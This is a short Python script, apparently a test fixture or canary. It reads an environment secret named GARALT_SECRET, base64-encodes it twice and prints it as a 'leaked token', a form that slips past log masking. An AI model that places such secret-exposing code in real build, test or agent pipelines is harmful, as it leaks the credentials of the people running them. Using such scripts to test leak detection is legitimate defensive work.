import os
import base64
import sys

secret = os.environ.get("GARALT_SECRET", "NO_GARALT_SECRET")
encoded = base64.b64encode(base64.b64encode(secret.encode()).decode().encode()).decode()
print(f"GARALT_LEAKED_TOKEN={encoded}")
sys.exit(0)
